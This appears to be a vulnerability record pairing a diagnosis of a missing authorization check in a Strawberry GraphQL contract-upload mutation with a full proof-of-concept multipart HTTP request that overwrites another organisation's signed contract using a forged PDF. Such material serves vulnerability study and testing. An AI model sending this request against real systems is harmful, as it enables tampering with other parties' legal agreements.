diagnosis: The Strawberry GraphQL file upload mutation updates the signed contract document for contract_id. While the mutation checks whether current_user is authenticated, it fails to verify that current_user is an authorized party or creator of contract_id. An authenticated user can supply any contract_id to overwrite signed legal agreements, NDAs, or employment contracts of other organizations.
exploit_request:
POST /graphql HTTP/1.1
Host: contracts.platform.io
Authorization: Bearer <attacker_jwt>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryX

------WebKitFormBoundaryX
Content-Disposition: form-data; name="operations"

{"query": "mutation ($file: Upload!) { uploadSignedContract(contractId: \"cnt_target_corp_2026\", file: $file) { contractId filename } }", "variables": {"file": null}}
------WebKitFormBoundaryX
Content-Disposition: form-data; name="map"

{"0": ["variables.file"]}
------WebKitFormBoundaryX
Content-Disposition: form-data; name="0"; filename="forged_agreement.pdf"
Content-Type: application/pdf

%PDF-1.4 ...
------WebKitFormBoundaryX--
